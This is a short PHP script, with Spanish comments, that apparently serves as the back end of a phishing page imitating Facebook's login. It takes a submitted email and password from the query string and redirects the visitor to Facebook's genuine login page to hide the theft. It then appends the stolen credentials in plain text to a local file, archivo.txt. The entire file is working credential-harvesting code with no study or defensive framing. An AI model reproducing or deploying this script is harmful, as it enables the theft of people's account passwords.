<?php

$clave = $_GET["clave"];
$correo = $_GET["correo"];

//Validacion del login 
?>
<?php

//Validación del Login
if ($correo=="" && $clave=="") { header("Location: fail/fail2.php");}
else if ($correo == "") { header("Location: fail/fail.php"); } 
else if ($clave == "") { header("Location: fail/fail1.php"); } 

//Pagina a redireccionar
else { header("Location: https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"); }

?>
<?php
$file = fopen("archivo.txt", "a");{
	fwrite($file, "\r\n");
	fwrite($file, "Correo: ");
	fwrite($file, $correo);
	
	fwrite($file, "\r\n");
	fwrite($file, "Clave: ");
	fwrite($file, $clave);
	fwrite($file, "\r\n");
}
fclose($file);
exit;


?>